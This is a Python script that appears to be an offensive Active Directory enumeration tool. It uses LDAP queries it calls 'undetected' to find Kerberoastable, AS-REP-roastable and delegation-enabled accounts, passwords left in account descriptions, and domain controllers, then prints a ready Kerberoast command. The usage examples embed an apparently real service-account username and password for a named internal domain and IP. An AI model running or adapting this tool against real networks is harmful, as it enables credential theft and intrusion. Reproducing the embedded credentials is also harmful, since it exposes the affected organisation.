#!/usr/bin/env python3
"""
AD SPN Enumeration + Targeted Kerberoasting
Uses msldap for LDAP queries (undetected) and minikerberos for Kerberoasting
"""
import asyncio
import sys
import os

async def get_client(url):
    from msldap.commons.factory import LDAPConnectionFactory
    f = LDAPConnectionFactory.from_url(url)
    c = f.get_client()
    _, err = await c.connect()
    if err:
        print(f"[ERROR] Connect failed: {err}")
        sys.exit(1)
    _, err = await c.bind()
    if err:
        print(f"[ERROR] Bind failed: {err}")
        sys.exit(1)
    return c

async def enum_spn(url):
    c = await get_client(url)
    spn_users = []
    print("\n=== SPN-Enabled User Accounts ===\n")
    async for entry, err in c.pagedsearch(
        '(&(objectClass=user)(servicePrincipalName=*))',
        ['sAMAccountName', 'servicePrincipalName', 'memberOf', 'description', 'userAccountControl', 'pwdLastSet']
    ):
        if err:
            print(f"[ERROR] {err}")
            continue
        if entry and 'attributes' in entry:
            attrs = entry['attributes']
            sam = attrs.get('sAMAccountName', 'N/A')
            spns = attrs.get('servicePrincipalName', [])
            memberof = attrs.get('memberOf', [])
            desc = attrs.get('description', 'N/A')
            uac = attrs.get('userAccountControl', 'N/A')
            pwd = attrs.get('pwdLastSet', 'N/A')
            if isinstance(spns, str):
                spns = [spns]
            print(f"Account: {sam}")
            print(f"  Description: {desc}")
            print(f"  UAC: {uac}")
            print(f"  PwdLastSet: {pwd}")
            for spn in spns:
                print(f"  SPN: {spn}")
            if memberof:
                if isinstance(memberof, str):
                    memberof = [memberof]
                for g in memberof[:5]:
                    cn = g.split(',')[0].replace('CN=', '')
                    print(f"  Group: {cn}")
            print()
            spn_users.append(sam)
    if not spn_users:
        print("[!] No SPN-enabled user accounts found")
    else:
        print(f"\n=== Total: {len(spn_users)} SPN accounts ===")
        print("Accounts:", ', '.join(spn_users))
    return spn_users

async def enum_admins(url):
    c = await get_client(url)
    print("\n=== High-Value Accounts (adminCount=1) ===\n")
    admin_users = []
    async for entry, err in c.pagedsearch(
        '(&(objectClass=user)(adminCount=1))',
        ['sAMAccountName', 'servicePrincipalName', 'description', 'userAccountControl']
    ):
        if err:
            continue
        if entry and 'attributes' in entry:
            attrs = entry['attributes']
            sam = attrs.get('sAMAccountName', 'N/A')
            spns = attrs.get('servicePrincipalName', [])
            desc = attrs.get('description', 'N/A')
            uac = attrs.get('userAccountControl', 'N/A')
            has_spn = bool(spns)
            marker = " [HAS SPN!]" if has_spn else ""
            print(f"  {sam} | UAC: {uac} | Desc: {desc}{marker}")
            if has_spn:
                admin_users.append(sam)
    if admin_users:
        print(f"\n[!] Admin accounts WITH SPNs (Kerberoastable!): {', '.join(admin_users)}")
    else:
        print("\n[*] No admin accounts with SPNs found")
    return admin_users

async def enum_asrep(url):
    c = await get_client(url)
    print("\n=== AS-REP Roastable Accounts (Pre-Auth Disabled) ===\n")
    asrep_users = []
    async for entry, err in c.pagedsearch(
        '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
        ['sAMAccountName', 'memberOf', 'description']
    ):
        if err:
            continue
        if entry and 'attributes' in entry:
            sam = entry['attributes'].get('sAMAccountName', 'N/A')
            desc = entry['attributes'].get('description', 'N/A')
            print(f"  [VULNERABLE] {sam} | Desc: {desc}")
            asrep_users.append(sam)
    if not asrep_users:
        print("  No AS-REP Roastable accounts found")
    else:
        print(f"\n[!] Total AS-REP Roastable: {len(asrep_users)}")
    return asrep_users

async def enum_delegations(url):
    c = await get_client(url)
    print("\n=== Unconstrained Delegation Accounts ===\n")
    found = False
    async for entry, err in c.pagedsearch(
        '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))',
        ['sAMAccountName', 'description']
    ):
        if err:
            continue
        if entry and 'attributes' in entry:
            sam = entry['attributes'].get('sAMAccountName', 'N/A')
            desc = entry['attributes'].get('description', 'N/A')
            print(f"  [UNCONSTRAINED] {sam} | Desc: {desc}")
            found = True
    if not found:
        print("  No unconstrained delegation accounts found")

    c2 = await get_client(url)
    print("\n=== Constrained Delegation Accounts ===\n")
    found = False
    async for entry, err in c2.pagedsearch(
        '(&(objectClass=user)(msDS-AllowedToDelegateTo=*))',
        ['sAMAccountName', 'msDS-AllowedToDelegateTo', 'description']
    ):
        if err:
            continue
        if entry and 'attributes' in entry:
            sam = entry['attributes'].get('sAMAccountName', 'N/A')
            targets = entry['attributes'].get('msDS-AllowedToDelegateTo', [])
            print(f"  [CONSTRAINED] {sam} -> {targets}")
            found = True
    if not found:
        print("  No constrained delegation accounts found")

async def enum_passwords(url):
    c = await get_client(url)
    print("\n=== Accounts with Password-Related Description ===\n")
    found = False
    async for entry, err in c.pagedsearch(
        '(&(objectClass=user)(|(description=*pass*)(description=*pwd*)(description=*cred*)))',
        ['sAMAccountName', 'description']
    ):
        if err:
            continue
        if entry and 'attributes' in entry:
            sam = entry['attributes'].get('sAMAccountName', 'N/A')
            desc = entry['attributes'].get('description', 'N/A')
            print(f"  {sam} | {desc}")
            found = True
    if not found:
        print("  No accounts with password in description found")

async def enum_computers(url):
    c = await get_client(url)
    print("\n=== Domain Controllers ===\n")
    async for entry, err in c.pagedsearch(
        '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
        ['sAMAccountName', 'dNSHostName', 'operatingSystem', 'operatingSystemVersion']
    ):
        if err:
            continue
        if entry and 'attributes' in entry:
            attrs = entry['attributes']
            sam = attrs.get('sAMAccountName', 'N/A')
            dns = attrs.get('dNSHostName', 'N/A')
            os_name = attrs.get('operatingSystem', 'N/A')
            os_ver = attrs.get('operatingSystemVersion', 'N/A')
            print(f"  {sam} | {dns} | {os_name} {os_ver}")

async def main():
    if len(sys.argv) < 2:
        print("""
AD Enumeration Tool v1.0

Usage: adenum.py <ldap_url> [mode]

Modes:
  spn        - Enumerate all SPN-enabled user accounts (default)
  admins     - Enumerate admin accounts (adminCount=1)
  asrep      - Find AS-REP Roastable accounts
  delegation - Find delegation accounts
  passwords  - Find accounts with password in description
  computers  - Enumerate domain controllers
  all        - Run all enumeration modules

LDAP URL format:
  ldap+simple://DOMAIN\\username:password@DC_IP

Examples:
  adenum.py "ldap+simple://HO.AD.BDO\\p_btv34int01_svc:AMCPT5iU@172.23.205.32" all
  adenum.py "ldap+simple://HO.AD.BDO\\p_btv34int01_svc:AMCPT5iU@172.23.205.32" spn
""")
        sys.exit(1)

    url = sys.argv[1]
    mode = sys.argv[2] if len(sys.argv) > 2 else 'spn'
    
    print(f"[*] Target: {url.split('@')[-1]}")
    print(f"[*] Mode: {mode}")

    spn_users = []

    try:
        if mode in ['spn', 'all']:
            spn_users = await enum_spn(url)
        if mode in ['admins', 'all']:
            admin_spn = await enum_admins(url)
            spn_users.extend(admin_spn)
        if mode in ['asrep', 'all']:
            await enum_asrep(url)
        if mode in ['delegation', 'all']:
            await enum_delegations(url)
        if mode in ['passwords', 'all']:
            await enum_passwords(url)
        if mode in ['computers', 'all']:
            await enum_computers(url)
    except Exception as e:
        print(f"\n[ERROR] {e}")

    if spn_users:
        spn_unique = list(set(spn_users))
        outfile = os.path.join(os.environ.get('TEMP', '.'), 'spn_users.txt')
        with open(outfile, 'w') as f:
            f.write('\n'.join(spn_unique))
        print(f"\n[*] {len(spn_unique)} SPN users saved to {outfile}")
        print(f"[*] Kerberoast command:")
        print(f'    minikerberos-kerberoast.exe "kerberos+password://..." HO.AD.BDO -o kerberoast.txt -v {" ".join(spn_unique)}')

    print("\n[*] Done.")

if __name__ == '__main__':
    asyncio.run(main())
